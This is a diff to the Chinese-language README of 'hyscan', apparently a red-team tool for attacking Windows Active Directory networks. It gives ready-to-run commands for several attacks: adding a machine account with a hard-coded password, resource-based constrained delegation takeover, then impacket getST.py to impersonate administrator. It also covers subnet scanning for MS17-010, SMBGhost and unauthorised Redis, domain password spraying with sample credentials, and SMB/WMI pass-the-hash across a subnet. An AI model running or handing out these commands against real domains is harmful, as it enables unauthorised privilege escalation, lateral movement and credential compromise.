@@ -85,29 +85,37 @@ SMB的type 2 445端口也是一样的，只需要如下即可
 
 ![ldapscan-searchdele](img/ldapscan-searchdele.png)
 
-其他的LDAP命令都是一样的，都写在了命令行参数中了
+其他的相关的LDAP查询命令都是一样的，都写在了命令行参数中了，这里就不用再每个都演示一下了
 
 ### 基于 LDAP 利用（添加机器用户/添加DNS记录/基于资源的约束委派利用）
 
-将自身能接管的主机都进行接管操作，其实就是设置了对应的`msds-allowedtoactonbehalfofotheridentity`参数来实现
+#### 添加机器用户
+
+这里添加机器用户的话，密码`123456`是写死的，要改的话自己可以改下....
+
+`hyscan.exe --scantype ldapscan --ldaptype addComputer --dc 192.168.4.11 --domainName hengge.com --pcname testcbd`
+
+![ldapscan-addcomputer](img/ldapscan-addcomputer.png)
+
+#### 基于资源的约束委派利用
+
+将自身能接管的主机都进行接管操作，原理就是设置了对应的`msds-allowedtoactonbehalfofotheridentity`参数来实现
+
+`hyscan.exe --scantype ldapscan --ldaptype RBCD --dc 192.168.4.11 --domainName hengge.com --pcname hgtest`
 
 ![ldapscan-rbcd](img/ldapscan-rbcd.png)
 
-之后利用的话就直接用impacket的getST.py进行申请TGS(ST)票据然后访问就可以了
+之后利用的话就直接用impacket的getST.py进行申请参数为paname的主机的TGS(ST)票据然后被接管的主机就可以了
 
-`python getST.py -dc-ip 192.168.4.11 hengge.com/新添加的机器名$:新添加的机器的密码 -spn cifs/接管的主机名 -impersonate administrator`
+`python getST.py -dc-ip 192.168.4.11 hengge.com/新加的机器名$:新加的机器密码 -spn cifs/被设置了接管msds-allowedtoactonbehalfofotheridentity的主机名 -impersonate administrator`
 
 ### 基于 端口开放扫描(服务指纹识别) 和 端口第三方服务利用(SMB MS-17010/SMBGhost探测/redis等第三方未授权)
 
 示例:
 
-单IP，多端口
-`hyscan.exe --scantype portscan --ip 192.168.4.11 --port 80,90 --thread 100`
+单IP，多端口：`hyscan.exe --scantype portscan --ip 192.168.4.11 --port 80,90 --thread 100`
 
-单IP,多端口
-`hyscan.exe --scantype portscan --cidr  192.168.4.1/24 --port 1-100,6379,445 --thread 100`
-
-内置了top100 和 top1000
+单IP，多端口：`hyscan.exe --scantype portscan --cidr  192.168.4.1/24 --port 1-100,6379,445 --thread 100`
 
 top100：`hyscan.exe --scantype portscan --cidr  192.168.4.1/24 --port top100 --thread 100`
 
@@ -214,17 +222,33 @@ top1000：`hyscan.exe --scantype portscan --cidr  192.168.4.1/24 --port top1000 
 
 - - - - 如果不存在则跳过继续探测下一台
 
-- - 如果当前的用户权限为本地组权限
+`hyscan.exe --scantype weakscan --dc 192.168.4.11 --domainName 当前域名 --domainUsername 当前域名\当前域用户名 --domainPassword 当前域用户密码 --domainPersonalPassword 自己填的一个要探测的密码`
 
-- - - 对当前网段的每台机器探测存活
+如下所示：
 
-- - - - 如果存活的话
+1、已知当前拿下权限的域用户的密码
 
-- - - - - 本地管理组administrator用户，如"admin@123"，"123456"
+`hyscan.exe --scantype weakscan --dc 192.168.4.11 --domainName HENGGE --domainUsername HENGGE\ske --domainPassword admin@123456 --domainPersonalPassword admin@44332211`
 
-`hyscan.exe --scantype weakscan`
+![weakscan-have-domainPassword](img/weakscan-have-domainPassword.png)
 
-![weakscan-cidr](img/weakscan-cidr.png)
+2、不知道当前拿下权限的域用户的密码，此时密码填写为`null`就好了
+
+`hyscan.exe --scantype weakscan --dc 192.168.4.11 --domainName HENGGE --domainUsername HENGGE\ske --domainPassword null --domainPersonalPassword admin@44332211`
+
+![weakscan-nohave-domainPassword](img/weakscan-nohave-domainPassword.png)
+
+### 基于 SMB/WMI PTH
+
+PTH的时候建议不要用WMI，我这里写的WMI有问题，WINDOWS COM组件我不太了解，它这里的WMI COM组件想要实现多线程的话会有问题，我这里解决不了，这里WMI这里写的就是单线程的，会很浪费时间，所以PTH的话这里只能用SMB来进行测试，SMB这里是多线程的
+
+`hyscan.exe --scantype pthscan --pthtype smb --cidr 192.168.4.1/24 --thread 100`
+
+![pthscan-smb](img/pthscan-smb.png)
+
+`hyscan.exe --scantype pthscan --pthtype wmi --cidr 192.168.4.131/24`
+
+![pthscan-wmi](img/pthscan-wmi.png)
 
 ## 参考
 
@@ -237,3 +261,13 @@ https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
 https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/
 
 https://github.com/robertdavidgraham/masscan
+
+## 参考
+
+2022.1.22变动
+
+1)本地组枚举的一些解析小bug，这里改了下
+
+2)实战的时候wmi/smb探测ntlm type2的时候速度太慢，加上了先发送arp进行探测存活再进行ntlm通信
+
+3)修复了下smb ntlm type2探测的bug
